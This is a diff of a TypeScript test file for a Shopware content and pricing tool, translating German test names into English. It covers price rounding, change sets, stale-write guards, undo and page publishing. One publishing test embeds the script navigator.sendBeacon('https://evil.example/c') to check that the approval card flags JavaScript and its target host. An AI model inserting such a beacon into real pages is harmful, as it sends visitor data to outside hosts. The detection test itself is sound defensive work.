@@ -4,41 +4,41 @@ import { resolvePrice, undoOps } from '../../src/server/changes';
 import type { PageSpec } from '../../src/server/cms';
 import type { Shopware } from '../../src/server/shopware';
 
-test('resolvePrice: feste Zahl wird auf Cent gerundet', () => {
+test('resolvePrice: fixed number is rounded to cents', () => {
   assert.equal(resolvePrice(10, 19.999), 20);
   assert.equal(resolvePrice(null, 12.345), 12.35);
 });
 
-test('resolvePrice: null entfernt (Streichpreis)', () => {
+test('resolvePrice: null removes (list price)', () => {
   assert.equal(resolvePrice(10, null), null);
 });
 
-test('resolvePrice: set mit und ohne Rundung', () => {
+test('resolvePrice: set with and without rounding', () => {
   assert.equal(resolvePrice(null, { set: 19.994 }), 19.99);
   assert.equal(resolvePrice(5, { set: 20.2, round: '.99' }), 19.99);
 });
 
-test('resolvePrice: Prozent-Regel mit .99-Rundung', () => {
+test('resolvePrice: percent rule with .99 rounding', () => {
   assert.equal(resolvePrice(20, { percent: -10, round: '.99' }), 17.99);
   assert.equal(resolvePrice(100, { percent: 10 }), 110);
   assert.equal(resolvePrice(19.99, { percent: -10 }), 17.99);
 });
 
-test('resolvePrice: add-Regel mit .00-Rundung', () => {
+test('resolvePrice: add rule with .00 rounding', () => {
   assert.equal(resolvePrice(10, { add: 2.5, round: '.00' }), 13);
   assert.equal(resolvePrice(10, { add: 2.4, round: '.00' }), 12);
 });
 
-test('resolvePrice: Rundung nie unter den Rundungswert', () => {
+test('resolvePrice: rounding never below the rounding value', () => {
   assert.equal(resolvePrice(0.3, { percent: 0, round: '.99' }), 0.99);
 });
 
-test('resolvePrice: Regel ohne aktuellen Preis bzw. unbekannte Regel wirft', () => {
+test('resolvePrice: rule without current price or unknown rule throws', () => {
   assert.throws(() => resolvePrice(null, { percent: 10 }), /Aktueller Preis unbekannt/);
   assert.throws(() => resolvePrice(10, {}), /Unbekannte Preisregel/);
 });
 
-test('resolvePrice: Rundungsmodus wird geprüft (Komma erlaubt, "99"/"1.99"/"abc" sind Fehler statt falscher Preise)', () => {
+test('resolvePrice: rounding mode is validated (comma allowed, "99"/"1.99"/"abc" are errors instead of wrong prices)', () => {
   assert.equal(resolvePrice(18, { percent: 0, round: ',99' }), 17.99);
   assert.equal(resolvePrice(18, { percent: 0, round: '0,99' }), 17.99);
   assert.equal(resolvePrice(18.2, { percent: 0, round: '0.95' }), 17.95);
@@ -48,7 +48,7 @@ test('resolvePrice: Rundungsmodus wird geprüft (Komma erlaubt, "99"/"1.99"/"abc
   assert.throws(() => resolvePrice(null, { set: 20, round: '99' }), /ungültig/);
 });
 
-test('Produktänderung: ungültiger Rundungsmodus landet in skipped, nicht als Preis im Set', async () => {
+test('product change: invalid rounding mode ends up in skipped, not as a price in the set', async () => {
   const { buildProductChangeSet } = await import('../../src/server/changes');
   const rows = [{ id: 'p1', productNumber: 'A', name: 'A', price: [{ currencyId: 'eur', gross: 20 }], tax: { taxRate: 19 } }];
   const ro = { search: async () => ({ data: rows }) } as unknown as Parameters<typeof buildProductChangeSet>[0];
@@ -58,7 +58,7 @@ test('Produktänderung: ungültiger Rundungsmodus landet in skipped, nicht als P
   assert.match(cs.skipped[0].reason, /round "99" ungültig/);
 });
 
-// ---- Executor (einziger schreibender Code) gegen einen Fake-Shopware mit Aufrufprotokoll ----
+// ---- Executor (the only writing code) against a fake Shopware with a call log ----
 interface Call { m: string; entity: string; id?: string; data?: unknown }
 function fakeShopware(db: Record<string, Record<string, unknown>[]>, opts: { failUpdate?: (entity: string, id: string) => Error | null } = {}) {
   const calls: Call[] = [];
@@ -69,7 +69,7 @@ function fakeShopware(db: Record<string, Record<string, unknown>[]>, opts: { fai
       let rows = db[entity] ?? [];
       if (c.ids) rows = rows.filter(r => c.ids!.includes(r.id as string));
       for (const f of c.filter ?? []) rows = rows.filter(r => r[f.field] === f.value);
-      return { data: rows.map(r => ({ ...r })), total: rows.length }; // Kopien wie echte API-Antworten
+      return { data: rows.map(r => ({ ...r })), total: rows.length }; // copies like real API responses
     },
     get: async (entity: string, id: string) => { const r = find(entity, id); return r ? { ...r } : null; },
     salesChannels: async () => db['sales-channel'] ?? [],
@@ -85,14 +85,14 @@ function fakeShopware(db: Record<string, Record<string, unknown>[]>, opts: { fai
 const item = (entityId: string, field: string, afterRaw: unknown, entity = 'product') => ({ id: `${entityId}:${field}`, entity, entityId, label: entityId, field, fieldLabel: field, before: '', after: '', afterRaw, warn: [] });
 const all = (cs: { items: { id: string }[] }) => new Set(cs.items.map(i => i.id));
 
-test('applyChangeSet: Preis + Streichpreis → ein PATCH mit brutto/netto (19 %)/linked, zweite Währung bleibt, Rückgängig = alter Preis', async () => {
+test('applyChangeSet: price + list price → one PATCH with gross/net (19 %)/linked, second currency stays, undo = old price', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const old = [{ currencyId: 'eur', gross: 20, net: 16.8067, linked: true }, { currencyId: 'usd', gross: 25, net: 21, linked: true }];
   const f = fakeShopware({ product: [{ id: 'p1', price: old.map(p => ({ ...p })), tax: { taxRate: 19 } }] });
   const cs = { id: 'cs', kind: 'products', entity: 'product', title: 't', reason: null, atomic: false, skipped: [], items: [item('p1', 'price', 17.99), item('p1', 'listPrice', 24.99), item('p1', 'name', 'Neu')] };
   const r = await applyChangeSet(f.sw, cs, undefined, all(cs));
   assert.deepEqual(r.results.map(x => x.ok), [true, true, true]);
-  assert.equal(f.calls.length, 1, 'eine Entität = ein PATCH');
+  assert.equal(f.calls.length, 1, 'one entity = one PATCH');
   const body = f.calls[0].data as { name: string; price: { currencyId: string; gross: number; net: number; linked: boolean; listPrice?: { gross: number; net: number } }[] };
   assert.equal(body.name, 'Neu');
   assert.equal(body.price.length, 2); assert.equal(body.price[1].currencyId, 'usd');
@@ -102,7 +102,7 @@ test('applyChangeSet: Preis + Streichpreis → ein PATCH mit brutto/netto (19 %)
   assert.deepEqual(r.undo[0].wrote, body);
 });
 
-test('applyChangeSet: Preis-PATCH behält den Grundpreis (regulationPrice)', async () => {
+test('applyChangeSet: price PATCH keeps the base price (regulationPrice)', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const reg = { currencyId: 'eur', gross: 12, net: 10.084, linked: false, apiAlias: 'price' };
   const old = [{ currencyId: 'eur', gross: 20, net: 16.8067, linked: true, regulationPrice: reg }];
@@ -115,7 +115,7 @@ test('applyChangeSet: Preis-PATCH behält den Grundpreis (regulationPrice)', asy
   assert.deepEqual(entry.regulationPrice, { currencyId: 'eur', gross: 12, net: 10.084, linked: false });
 });
 
-test('applyChangeSet: Variante ohne eigenen Preis nimmt Basis/Steuer vom Hauptprodukt, Rückgängig stellt die Vererbung (price null) wieder her', async () => {
+test('applyChangeSet: variant without own price takes base/tax from the parent product, undo restores inheritance (price null)', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const f = fakeShopware({ product: [{ id: 'v1', parentId: 'p', price: null, tax: null }, { id: 'p', price: [{ currencyId: 'eur', gross: 89, listPrice: { currencyId: 'eur', gross: 99 } }], tax: { taxRate: 7 } }] });
   const cs = { id: 'cs', kind: 'products', entity: 'product', title: 't', reason: null, atomic: false, skipped: [], items: [item('v1', 'listPrice', 120)] };
@@ -131,7 +131,7 @@ test('applyChangeSet: Variante ohne eigenen Preis nimmt Basis/Steuer vom Hauptpr
   assert.deepEqual(back.calls[0].data, { price: null });
 });
 
-test('applyChangeSet: nur ausgewählte Elemente, Fehler je Entität (andere laufen weiter), FAQ als Zusatzfeld', async () => {
+test('applyChangeSet: only selected items, errors per entity (others continue), FAQ as custom field', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const f = fakeShopware({ product: [{ id: 'a', stock: 1, customFields: { aicb_blocks: { x: 1 } } }, { id: 'b', stock: 2 }, { id: 'c' }], 'custom-field-set': [{ id: 'cfs', name: 'aicb_content' }] }, { failUpdate: (_e, id) => (id === 'b' ? new Error('gesperrt') : null) });
   const faq = { title: 'FAQ', items: [{ q: 'A?', a: 'B.' }, { q: 'C?', a: 'D.' }] };
@@ -139,32 +139,32 @@ test('applyChangeSet: nur ausgewählte Elemente, Fehler je Entität (andere lauf
   const r = await applyChangeSet(f.sw, cs, undefined, new Set(['a:stock', 'a:faq', 'b:stock']));
   assert.deepEqual(Object.fromEntries(r.results.map(x => [x.itemId, x.ok])), { 'a:stock': true, 'a:faq': true, 'b:stock': false });
   assert.match(r.results.find(x => x.itemId === 'b:stock')!.error!, /gesperrt/);
-  assert.equal(f.calls.filter(c => c.m === 'PATCH').length, 1, 'c nicht ausgewählt, b fehlgeschlagen');
+  assert.equal(f.calls.filter(c => c.m === 'PATCH').length, 1, 'c not selected, b failed');
   const body = f.calls[0].data as { stock: number; customFields: { aicb_blocks: { x: number; faq: unknown; faq_html: string } } };
   assert.equal(body.stock, 5); assert.equal(body.customFields.aicb_blocks.x, 1); assert.deepEqual(body.customFields.aicb_blocks.faq, faq.items); assert.match(body.customFields.aicb_blocks.faq_html, /A\?/);
   assert.deepEqual(r.undo[0].data, { stock: 1, customFields: { aicb_blocks: { x: 1 } } });
   assert.deepEqual(r.undo[0].wrote, body);
 });
 
-// ---- Stale-Write-Guard: inzwischen geänderte Felder werden nicht geschrieben, die übrigen schon ----
+// ---- Stale-write guard: fields changed in the meantime are not written, the others are ----
 const gi = (entityId: string, field: string, afterRaw: unknown, beforeRaw: unknown, fieldLabel: string, entity = 'product') => ({ ...item(entityId, field, afterRaw, entity), fieldLabel, beforeRaw });
 const setOf = (kind: 'products' | 'categories', items: ReturnType<typeof gi>[]) => ({ id: 'cs', kind, entity: kind === 'products' ? 'product' : 'category', title: 't', reason: null, atomic: false, skipped: [], items });
 
-test('normValue/isStale: Formatierung ist keine Änderung, echte Änderung schon; ohne Snapshot (Altbestand) keine Prüfung', async () => {
+test('normValue/isStale: formatting is not a change, a real change is; without snapshot (legacy data) no check', async () => {
   const { normValue, isStale } = await import('../../src/server/changes');
   assert.equal(normValue('<p>Hallo  Welt</p>\n  <p>x</p>'), normValue('<p>Hallo Welt</p><p>x</p>'));
   assert.equal(normValue(17.99), normValue(17.990000001));
   assert.equal(normValue({ a: null, b: 1 }), normValue({ b: 1 }));
   assert.equal(normValue([]), normValue(null)); assert.equal(normValue(''), normValue(undefined));
-  assert.equal(isStale('x', undefined), false, 'kein Snapshot → keine Prüfung');
+  assert.equal(isStale('x', undefined), false, 'no snapshot → no check');
   assert.equal(isStale(null, ''), false);
   assert.equal(isStale(20, 22), true); assert.equal(isStale(false, true), true);
   assert.equal(isStale([{ q: 'a', a: 'b' }], [{ q: 'a', a: 'c' }]), true);
 });
 
-test('Stale-Write-Guard Produkt: Preis/Text/FAQ inzwischen geändert → nur diese Felder fehlgeschlagen und nicht im PATCH, übrige Felder derselben Entität schon', async () => {
+test('stale-write guard product: price/text/FAQ changed in the meantime → only these fields failed and not in the PATCH, other fields of the same entity are', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
-  // Vorschlag sah Preis 20, Beschreibung „<p>alt</p>“, 1 FAQ; Admin hat inzwischen Preis 22 und die FAQ geändert, der Name blieb
+  // proposal saw price 20, description "<p>alt</p>", 1 FAQ; admin has since changed the price to 22 and the FAQ, the name stayed
   const faqAlt = [{ q: 'A?', a: 'B.' }], faqNeu = { title: 'FAQ', items: [{ q: 'A?', a: 'B.' }, { q: 'C?', a: 'D.' }] };
   const f = fakeShopware({ product: [{ id: 'p1', name: 'Alt', description: '<p>alt</p>', price: [{ currencyId: 'eur', gross: 22, net: 18.49, linked: true }], tax: { taxRate: 19 }, customFields: { aicb_blocks: { faq: [{ q: 'A?', a: 'Admin.' }] } } }], 'custom-field-set': [{ id: 'cfs', name: 'aicb_content' }] });
   const cs = setOf('products', [gi('p1', 'price', 17.99, 20, 'Preis (brutto)'), gi('p1', 'name', 'Neu', 'Alt', 'Name'), gi('p1', 'description', '<p>neu</p>', '<p>alt</p>\n', 'Beschreibung'), gi('p1', 'faq', faqNeu, faqAlt, 'FAQ (Zusatzfeld)')]);
@@ -174,14 +174,14 @@ test('Stale-Write-Guard Produkt: Preis/Text/FAQ inzwischen geändert → nur die
     { itemId: 'p1:faq', ok: false, error: 'FAQ (Zusatzfeld): inzwischen geändert, bitte neu vorschlagen' },
   ]);
   assert.equal(f.calls.filter(c => c.m === 'PATCH').length, 1);
-  assert.deepEqual(f.calls[0].data, { name: 'Neu', description: '<p>neu</p>' }, 'Preis und FAQ nicht geschrieben');
+  assert.deepEqual(f.calls[0].data, { name: 'Neu', description: '<p>neu</p>' }, 'price and FAQ not written');
   assert.deepEqual(r.undo[0].data, { name: 'Alt', description: '<p>alt</p>' });
   assert.deepEqual(r.undo[0].wrote, { name: 'Neu', description: '<p>neu</p>' });
-  // alle Felder der Entität stale → kein Schreibzugriff, kein Rückgängig-Schritt
+  // all fields of the entity stale → no write, no undo step
   const g = fakeShopware({ product: [{ id: 'p1', price: [{ currencyId: 'eur', gross: 22 }], tax: { taxRate: 19 } }] });
   const cs2 = setOf('products', [gi('p1', 'price', 17.99, 20, 'Preis (brutto)'), gi('p1', 'listPrice', 29, null, 'Streichpreis (brutto)')]);
   const r2 = await applyChangeSet(g.sw, cs2, undefined, all(cs2));
-  assert.deepEqual(r2.results.map(x => x.ok), [false, true], 'Streichpreis war und ist leer: wird mit dem frischen Preis 22 geschrieben');
+  assert.deepEqual(r2.results.map(x => x.ok), [false, true], 'list price was and is empty: written with the fresh price 22');
   assert.deepEqual((g.calls[0].data as { price: { gross: number; listPrice: { gross: number } }[] }).price[0].gross, 22);
   const h = fakeShopware({ product: [{ id: 'p1', stock: 3 }] });
   const cs3 = setOf('products', [gi('p1', 'stock', 0, 5, 'Bestand')]);
@@ -189,14 +189,14 @@ test('Stale-Write-Guard Produkt: Preis/Text/FAQ inzwischen geändert → nur die
   assert.deepEqual([r3.results[0].ok, h.calls.length, r3.undo], [false, 0, []]);
 });
 
-test('Stale-Write-Guard Kategorie: Beschreibung inzwischen geändert → fehlgeschlagen; unveränderte Felder (auch nur anders formatiert) schreiben wie bisher', async () => {
+test('stale-write guard category: description changed in the meantime → failed; unchanged fields (even if only formatted differently) are written as before', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const f = fakeShopware({ category: [{ id: 'c1', name: 'Wohnen', description: '<p>vom Admin</p>', translated: { name: 'Wohnen', metaTitle: 'Wohnen | Shop' } }] });
   const cs = setOf('categories', [gi('c1', 'description', '<p>neu</p>', '<p>alt</p>', 'Beschreibung', 'category'), gi('c1', 'name', 'Wohnen & Leben', 'Wohnen', 'Name', 'category'), gi('c1', 'metaTitle', 'Neu', 'Wohnen  |  Shop', 'Meta-Title', 'category')]);
   const r = await applyChangeSet(f.sw, cs, undefined, all(cs));
   assert.deepEqual(r.results.map(x => [x.ok, x.error]), [[false, 'Beschreibung: inzwischen geändert, bitte neu vorschlagen'], [true, undefined], [true, undefined]]);
   assert.deepEqual(f.calls[0].data, { name: 'Wohnen & Leben', metaTitle: 'Neu' });
-  // unveränderter Shop: alles wird geschrieben, Verhalten wie ohne Guard
+  // unchanged shop: everything is written, behavior as without guard
   const g = fakeShopware({ product: [{ id: 'p1', name: 'Alt', price: [{ currencyId: 'eur', gross: 20, net: 16.81, linked: true }], tax: { taxRate: 19 } }] });
   const cs2 = setOf('products', [gi('p1', 'price', 17.99, 20, 'Preis (brutto)'), gi('p1', 'name', 'Neu', 'Alt', 'Name'), gi('p1', 'description', '<p>x</p>', null, 'Beschreibung')]);
   const r2 = await applyChangeSet(g.sw, cs2, undefined, all(cs2));
@@ -204,7 +204,7 @@ test('Stale-Write-Guard Kategorie: Beschreibung inzwischen geändert → fehlges
   assert.equal((g.calls[0].data as { price: { gross: number }[] }).price[0].gross, 17.99);
 });
 
-test('Builder merkt den Rohwert (beforeRaw) je Feld: Preis, Text, Zahl, FAQ', async () => {
+test('builder remembers the raw value (beforeRaw) per field: price, text, number, FAQ', async () => {
   const { buildProductChangeSet } = await import('../../src/server/changes');
   const rows = [{ id: 'p1', productNumber: 'A', name: 'A', description: '<p>alt</p>', stock: 4, price: [{ currencyId: 'eur', gross: 20, listPrice: { gross: 25 } }], tax: { taxRate: 19 }, customFields: { aicb_blocks: { faq: [{ q: 'x', a: 'y' }] } } }];
   const ro = { search: async () => ({ data: rows }) } as unknown as Parameters<typeof buildProductChangeSet>[0];
@@ -215,7 +215,7 @@ test('Builder merkt den Rohwert (beforeRaw) je Feld: Preis, Text, Zahl, FAQ', as
 const SPEC = { name: 'Seite X', type: 'product_list', sections: [{ blocks: [{ type: 'text', html: '<p>Hallo</p>' }, { type: 'product-listing' }] }] } as unknown as PageSpec;
 const pageCs = (items: string[]) => ({ id: 'cs', kind: 'page', title: 't', reason: null, atomic: true, skipped: [], items: items.map(id => ({ id, entity: 'info', label: id, fieldLabel: '', before: '', after: '', warn: [] })) });
 
-test('applyPublish: Fehler nach dem Anlegen des Layouts nimmt das Layout wieder zurück (atomar), alle Zeilen fehlgeschlagen, kein verwaistes Rückgängig', async () => {
+test('applyPublish: error after creating the layout rolls the layout back (atomic), all rows failed, no orphaned undo', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const f = fakeShopware({ category: [{ id: 'cat', cmsPageId: 'alt' }], 'sales-channel': [{ id: 'sc', domains: [{ url: 'https://shop.test' }] }] }, { failUpdate: (e) => (e === 'category' ? Object.assign(new Error('Shopware PATCH /category/cat → 400: metaTitle zu lang'), { status: 400 }) : null) });
   const r = await applyChangeSet(f.sw, pageCs(['i0', 'i1']), { spec: SPEC, args: { target: 'category', categoryId: 'cat', metaTitle: 'x'.repeat(300) } }, new Set(['i0', 'i1']));
@@ -223,15 +223,15 @@ test('applyPublish: Fehler nach dem Anlegen des Layouts nimmt das Layout wieder 
   assert.match(r.error!, /metaTitle zu lang/); assert.match(r.error!, /Layout wieder entfernt/);
   assert.deepEqual(r.undo, []);
   assert.deepEqual(f.calls.map(c => `${c.m} ${c.entity}`), ['POST cms-page', 'DELETE cms-page']);
-  assert.equal(f.db['cms-page'].length, 0, 'kein verwaistes Layout im Shop');
+  assert.equal(f.db['cms-page'].length, 0, 'no orphaned layout in the shop');
   assert.equal(f.db.category[0].cmsPageId, 'alt');
-  // gelöschte Kategorie: klarer Fehler statt TypeError
+  // deleted category: clear error instead of TypeError
   const g = fakeShopware({ 'sales-channel': [] });
   const r2 = await applyChangeSet(g.sw, pageCs(['i0']), { spec: SPEC, args: { target: 'category', categoryId: 'weg' } }, new Set(['i0']));
   assert.match(r2.error!, /Kategorie nicht mehr vorhanden/); assert.equal(g.db['cms-page'].length, 0);
 });
 
-test('applyPublish: Erfolg liefert Rückgängig für Layout und Zuweisung; scheitert die Rückabwicklung, bleibt der Rest-Undo erhalten', async () => {
+test('applyPublish: success returns undo for layout and assignment; if the rollback fails, the remaining undo is kept', async () => {
   const { applyChangeSet, undoOps } = await import('../../src/server/changes');
   const f = fakeShopware({ category: [{ id: 'cat', cmsPageId: 'alt', metaTitle: 'Alt' }], 'sales-channel': [{ id: 'sc', domains: [{ url: 'https://shop.test' }] }] });
   const r = await applyChangeSet(f.sw, pageCs(['i0', 'i1']), { spec: SPEC, args: { target: 'category', categoryId: 'cat', metaTitle: 'Neu' } }, new Set(['i0', 'i1']));
@@ -241,7 +241,7 @@ test('applyPublish: Erfolg liefert Rückgängig für Layout und Zuweisung; schei
   assert.equal(f.db.category[0].cmsPageId, r.published?.cmsPageId);
   await undoOps(f.sw, r.undo);
   assert.equal(f.db.category[0].cmsPageId, 'alt'); assert.equal(f.db.category[0].metaTitle, 'Alt'); assert.equal(f.db['cms-page'].length, 0);
-  // Landingpage: Rückabwicklung scheitert (DELETE wirft) → Undo bleibt in der Antwort
+  // landing page: rollback fails (DELETE throws) → undo stays in the response
   const g = fakeShopware({ 'sales-channel': [{ id: 'sc', domains: [{ url: 'https://shop.test' }] }] });
   g.sw.create = async (entity: string, data: Record<string, unknown>) => { if (entity === 'landing-page') throw new Error('400: url belegt'); g.calls.push({ m: 'POST', entity, data }); (g.db[entity] ||= []).push(data); return null; };
   g.sw.req = async () => { throw Object.assign(new Error('500'), { status: 500 }); };
@@ -250,12 +250,12 @@ test('applyPublish: Erfolg liefert Rückgängig für Layout und Zuweisung; schei
   assert.equal(r2.undo.length, 1); assert.equal(r2.undo[0].entity, 'cms-page');
 });
 
-test('buildPublishChangeSet: Landingpage-URL wird normalisiert, ungültige URL/Duplikat/fehlende Kategorie/zu lange Metas werden abgelehnt', async () => {
+test('buildPublishChangeSet: landing page URL is normalized, invalid URL/duplicate/missing category/too long metas are rejected', async () => {
   const { buildPublishChangeSet, landingSlug } = await import('../../src/server/changes');
   assert.equal(landingSlug('/Ratgeber/Garten-Duschen/'), 'ratgeber/garten-duschen');
   for (const u of ['Ratgeber/Garten Duschen?x=1', 'a#b', 'ä', 'a//b', '', 'a?x']) assert.throws(() => landingSlug(u), /ungültig/, u);
   const f = fakeShopware({ category: [{ id: 'cat', translated: { name: 'Vasen' } }], product: [{ id: 'p1', translated: { name: 'P' } }], 'sales-channel': [{ id: 'sc', translated: { name: 'Storefront' } }], 'landing-page': [{ id: 'lp', url: 'ratgeber/alt', name: 'Alt', salesChannels: [{ id: 'sc' }] }] });
-  f.sw.search = (async (entity: string, c: { filter?: { field: string; value: unknown }[]; ids?: string[] }) => { // Fake: Verkaufskanal-Filter über die Zuordnung
+  f.sw.search = (async (entity: string, c: { filter?: { field: string; value: unknown }[]; ids?: string[] }) => { // fake: sales channel filter via the assignment
     let rows = f.db[entity] ?? []; if (c.ids) rows = rows.filter(r => c.ids!.includes(r.id as string));
     for (const fl of c.filter ?? []) rows = rows.filter(r => (fl.field === 'salesChannels.id' ? (r.salesChannels as { id: string }[]).some(s => s.id === fl.value) : r[fl.field] === fl.value));
     return { data: rows, total: rows.length };
@@ -271,12 +271,12 @@ test('buildPublishChangeSet: Landingpage-URL wird normalisiert, ungültige URL/D
   await assert.rejects(buildPublishChangeSet(f.sw, { ...SPEC, type: 'product_detail' } as PageSpec, { target: 'product', productIds: ['p1', 'p2'] }), /Produkt nicht gefunden: p2/);
   const cat = await buildPublishChangeSet(f.sw, SPEC, { target: 'category', categoryId: 'cat', metaTitle: 'Titel' });
   assert.equal(cat.items[1].label, 'Kategorie „Vasen“'); assert.equal(cat.items[2].after, 'Titel');
-  assert.equal(cat.script, undefined, 'ohne JS keine Warnung');
+  assert.equal(cat.script, undefined, 'no warning without JS');
   const js = await buildPublishChangeSet(f.sw, { ...SPEC, sections: [{ blocks: [{ type: 'custom-html', html: '<p>x</p>', js: "navigator.sendBeacon('https://evil.example/c')" }, { type: 'product-listing' }] }] } as unknown as PageSpec, { target: 'category', categoryId: 'cat' });
-  assert.deepEqual(js.script, { kinds: ['js'], hosts: ['evil.example'] }, 'Freigabe-Karte zeigt JavaScript und Zieladresse');
+  assert.deepEqual(js.script, { kinds: ['js'], hosts: ['evil.example'] }, 'approval card shows JavaScript and target address');
 });
 
-test('Neue Produkte: Änderungsset mit Payload, Standard inaktiv, Preis Pflicht', async () => {
+test('new products: change set with payload, inactive by default, price required', async () => {
   const { buildNewProductsChangeSet } = await import('../../src/server/changes');
   const ro = { search: async (entity: string) => ({ data: entity === 'tax' ? [{ id: 'tax19', taxRate: 19 }, { id: 'tax7', taxRate: 7 }] : entity === 'category' ? [{ id: 'cat1', name: 'Wohnen' }] : entity === 'media' ? [{ id: 'm1', url: 'http://shop.test/media/a.jpg' }] : [] }) } as unknown as Parameters<typeof buildNewProductsChangeSet>[0];
   const cs = await buildNewProductsChangeSet(ro, { title: 'Neu', reason: 'Fotos', products: [
@@ -293,7 +293,7 @@ test('Neue Produkte: Änderungsset mit Payload, Standard inaktiv, Preis Pflicht'
   assert.match(cs.skipped[0].reason, /Preis/);
 });
 
-test('Neues Produkt: Zeitlimit nach dem Anlegen lässt einen Löschschritt zurück, ein zweiter Lauf legt nicht noch eins an', async () => {
+test('new product: timeout after creation leaves a delete step behind, a second run does not create another one', async () => {
   const { applyChangeSet } = await import('../../src/server/changes');
   const f = fakeShopware({ 'sales-channel': [] });
   const orig = f.sw.create.bind(f.sw);
@@ -313,10 +313,10 @@ test('Neues Produkt: Zeitlimit nach dem Anlegen lässt einen Löschschritt zurü
   const r2 = await applyChangeSet(f.sw, cs as never, undefined, new Set(['neu-1']));
   assert.equal(r2.results[0].ok, false, JSON.stringify(r2.results));
   assert.match(r2.results[0].error ?? '', /schon vergeben/);
-  assert.equal(f.db.product.length, 1, 'kein zweites Produkt');
+  assert.equal(f.db.product.length, 1, 'no second product');
 });
 
-test('Produktänderung: Preisregel auf Variante mit geerbtem Preis (Basis = Hauptprodukt), null = wieder erben', async () => {
+test('product change: price rule on variant with inherited price (base = parent product), null = inherit again', async () => {
   const { buildProductChangeSet } = await import('../../src/server/changes');
   const parent = { id: 'p', productNumber: 'P', name: 'Plaid', price: [{ currencyId: 'eur', gross: 89, listPrice: { gross: 99 } }], tax: { taxRate: 19 } };
   const rows: Record<string, unknown>[] = [{ id: 'v1', parentId: 'p', productNumber: 'P.1', price: null }, { id: 'v2', parentId: 'p', productNumber: 'P.2', price: [{ currencyId: 'eur', gross: 95 }] }, parent];
@@ -327,7 +327,7 @@ test('Produktänderung: Preisregel auf Variante mit geerbtem Preis (Basis = Haup
   const it = Object.fromEntries(cs.items.map(i => [i.id + (i.afterRaw === null ? ':null' : ''), i]));
   assert.equal(it['v1:price'].before, '89,00 € (geerbt)'); assert.equal(it['v1:price'].afterRaw, 79.99);
   assert.equal(it['v1:listPrice'].afterRaw, 100);
-  assert.deepEqual(it['v1:listPrice'].warn, []); // Preis wird ohnehin gesetzt
+  assert.deepEqual(it['v1:listPrice'].warn, []); // price is set anyway
   const only = await buildProductChangeSet(ro, { title: 't', reason: 'r', changes: [{ id: 'v1', fields: { listPrice: 120 } }] });
   assert.deepEqual(only.items[0].warn, ['Preis wird fixiert (bisher geerbt: 89,00 €)']);
   assert.equal(it['v2:price:null'].after, 'erbt vom Hauptprodukt');
@@ -335,7 +335,7 @@ test('Produktänderung: Preisregel auf Variante mit geerbtem Preis (Basis = Haup
   assert.match(cs.skipped[0].reason, /nur bei Varianten/);
 });
 
-test('undoOps: gelöschte Produkte/Kategorien verlieren auch ihre (von Shopware nur als gelöscht markierten) SEO-URLs', async () => {
+test('undoOps: deleted products/categories also lose their SEO URLs (which Shopware only marks as deleted)', async () => {
   const calls: string[] = [];
   const sw = {
     req: async (m: string, path: string) => { calls.push(`${m} ${path}`); return null; },
@@ -346,7 +346,7 @@ test('undoOps: gelöschte Produkte/Kategorien verlieren auch ihre (von Shopware 
   assert.deepEqual(calls, ['DELETE /product-media/m1', 'DELETE /product/p1', 'DELETE /seo-url/s1', 'DELETE /seo-url/s2']);
 });
 
-test('undoOps: schon gelöschte Ziele (404) gelten als rückgängig gemacht, andere Fehler nicht', async () => {
+test('undoOps: already deleted targets (404) count as undone, other errors do not', async () => {
   const fail = (status: number) => Object.assign(new Error(`→ ${status}`), { status });
   const sw = {
     req: async (m: string, path: string) => { if (path.includes('gone')) throw fail(404); if (path.includes('locked')) throw fail(400); return null; },
@@ -362,11 +362,11 @@ test('undoOps: schon gelöschte Ziele (404) gelten als rückgängig gemacht, and
   assert.deepEqual(r.map(x => x.ok), [true, true, false, false]);
 });
 
-test('undoOps: ohne gespeicherten Nachher-Wert wie bisher; mit Nachher-Wert nur, wenn der Shop noch den geschriebenen oder den vorherigen Wert hat', async () => {
+test('undoOps: without stored after value as before; with after value only if the shop still has the written or the previous value', async () => {
   const old = fakeShopware({ product: [{ id: 'p1', name: 'Von Hand' }] });
   const kept = await undoOps(old.sw, [{ op: 'patch', entity: 'product', id: 'p1', data: { name: 'Alt' } }]);
   assert.equal(kept[0].ok, true);
-  assert.equal(old.db.product[0].name, 'Alt', 'Altbestand ohne Nachher-Wert schreibt weiter');
+  assert.equal(old.db.product[0].name, 'Alt', 'legacy data without after value keeps writing');
 
   const moved = fakeShopware({ product: [{ id: 'p1', name: 'Von Hand' }] });
   const skipped = await undoOps(moved.sw, [{ op: 'patch', entity: 'product', id: 'p1', data: { name: 'Alt' }, wrote: { name: 'Neu' } }]);
@@ -380,7 +380,7 @@ test('undoOps: ohne gespeicherten Nachher-Wert wie bisher; mit Nachher-Wert nur,
   assert.equal(fresh.db.product[0].name, 'Alt');
 });
 
-test('Layout-Bereichswahl: Bereich wird in feste IDs aufgelöst, große Mengen als Zusammenfassung, atomar und rückgängig', async () => {
+test('layout scope selection: scope is resolved into fixed IDs, large sets as summary, atomic and undoable', async () => {
   const { resolvePublishScope } = await import('../../src/server/platform/shopware/pages');
   const { buildPublishChangeSet, applyChangeSet, undoOps } = await import('../../src/server/changes');
   const products: Record<string, unknown>[] = Array.from({ length: 30 }, (_, i) => ({ id: `p${i}`, name: `P${i}`, parentId: null, cmsPageId: i < 4 ? 'alt' : null, categoriesRo: [{ id: i % 2 ? 'outdoor' : 'wohnen' }] }));
@@ -402,18 +402,18 @@ test('Layout-Bereichswahl: Bereich wird in feste IDs aufgelöst, große Mengen a
   const PDP = { ...SPEC, type: 'product_detail' } as PageSpec;
 
   const inCat = await resolvePublishScope(f.sw, { target: 'product', productsInCategoryId: 'outdoor' });
-  assert.equal(inCat.productIds!.length, 15, 'ohne Varianten');
+  assert.equal(inCat.productIds!.length, 15, 'without variants');
   assert.match(inCat.scopeLabel!, /Kategorie „Outdoor“.*: 15/);
   const all = await resolvePublishScope(f.sw, { target: 'product', allProducts: true });
   assert.equal(all.productIds!.length, 30);
   const allCats = await resolvePublishScope(f.sw, { target: 'category', allCategories: true });
-  assert.deepEqual(allCats.categoryIds!.sort(), ['outdoor', 'wohnen'], 'nur Seiten-Kategorien ohne Wurzel');
